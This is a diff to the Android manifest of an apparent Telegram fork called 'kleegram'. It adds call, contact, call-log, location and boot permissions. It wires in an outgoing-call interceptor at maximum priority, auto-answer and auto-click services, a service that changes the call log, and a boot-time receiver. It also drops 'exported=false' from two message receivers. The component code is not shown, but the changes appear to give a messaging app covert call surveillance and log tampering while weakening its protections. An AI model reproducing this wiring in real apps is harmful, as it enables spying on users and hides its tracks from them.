@@ -16,6 +16,31 @@
     <uses-feature android:name="android.hardware.screen.PORTRAIT" android:required="false" />
     <uses-feature android:name="android.hardware.microphone" android:required="false" />
 
+    <uses-permission android:name="android.permission.CALL_PHONE" />
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.WRITE_CONTACTS" />
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.WRITE_SETTINGS" />
+    <!--
+    Allows an application to get information about the currently or recently running tasks: a thumbnail representation of the tasks, what activities are running in it, etc.
+    Used for detection of application state (Foreground / Background / OnTop / etc.)
+   -->
+    <uses-permission android:name="android.permission.GET_TASKS" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+
+    <uses-sdk
+        android:minSdkVersion="11"
+        android:targetSdkVersion="19" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+    <uses-permission android:name="android.permission.WRITE_CALL_LOG"/>
+    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
@@ -99,8 +124,6 @@
                 <category android:name="android.intent.category.BROWSABLE" />
                 <data android:host="telegram.me" android:scheme="http" />
                 <data android:host="telegram.me" android:scheme="https" />
-                <data android:host="telegram.dog" android:scheme="http" />
-                <data android:host="telegram.dog" android:scheme="https" />
             </intent-filter>
             <intent-filter android:icon="@drawable/ic_launcher" android:priority="1">
                 <action android:name="android.intent.action.VIEW" />
@@ -121,6 +144,13 @@
             android:name="org.telegram.ui.IntroActivity"
             android:configChanges="keyboard|keyboardHidden|orientation|screenSize">
         </activity>
+
+
+        <activity
+            android:name="org.telegram.kleegram.SettingsFragment"
+            android:configChanges="keyboard|keyboardHidden|orientation|screenSize">
+        </activity>
+
         <activity
             android:name="org.telegram.ui.PopupNotificationActivity"
             android:configChanges="keyboard|keyboardHidden|navigation|orientation|screenLayout|uiMode|screenSize|smallestScreenSize"
@@ -131,25 +161,15 @@
             android:windowSoftInputMode="adjustResize|stateHidden">
         </activity>
 
-        <receiver
-            android:name=".AutoMessageHeardReceiver"
-            android:exported="false">
+        <receiver android:name=".AutoMessageHeardReceiver">
             <intent-filter>
                 <action android:name="org.telegram.messenger.ACTION_MESSAGE_HEARD"/>
             </intent-filter>
         </receiver>
 
-        <receiver
-            android:name=".AutoMessageReplyReceiver"
-            android:exported="false">
+        <receiver android:name=".AutoMessageReplyReceiver">
             <intent-filter>
                 <action android:name="org.telegram.messenger.ACTION_MESSAGE_REPLY"/>
-            </intent-filter>
-        </receiver>
-
-        <receiver android:name=".CallReceiver" >
-            <intent-filter>
-                <action android:name="android.intent.action.PHONE_STATE" />
             </intent-filter>
         </receiver>
 
@@ -212,6 +232,35 @@
         </receiver>
 
         <receiver android:name=".WearReplyReceiver" android:enabled="true"/>
+
+        <receiver android:name="org.telegram.kleegram.autoanswer.AutoAnswerReceiver" android:enabled="true">
+            <intent-filter>
+                <action android:name="android.intent.action.PHONE_STATE" />
+            </intent-filter>
+        </receiver>
+        <receiver android:name="org.telegram.kleegram.autoanswer.AutoAnswerBootReceiver" android:enabled="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+        <receiver android:name="org.telegram.kleegram.autoanswer.OutgoingCallInterceptor" android:enabled="true">
+            <intent-filter android:priority="2147483647">
+                <action android:name="android.intent.action.NEW_OUTGOING_CALL"></action>
+            </intent-filter>
+        </receiver>
+
+        <receiver android:name="org.telegram.kleegram.NotificationClick">
+            <intent-filter>
+                <action android:name="com.sipax.click.notification"/>
+            </intent-filter>
+        </receiver>
+
+        <service android:name="org.telegram.kleegram.autoanswer.AutoAnswerIntentService" />
+        <service android:name="org.telegram.kleegram.autoanswer.AutoClickIntentService" />
+        <service android:name="org.telegram.kleegram.autoanswer.ChangeCallLogIntentService" />
+
+
+        <service android:name="org.telegram.kleegram.GetLastCallCostService" />
 
         <uses-library android:name="com.sec.android.app.multiwindow" android:required="false" />
         <meta-data android:name="com.sec.android.support.multiwindow" android:value="true" />
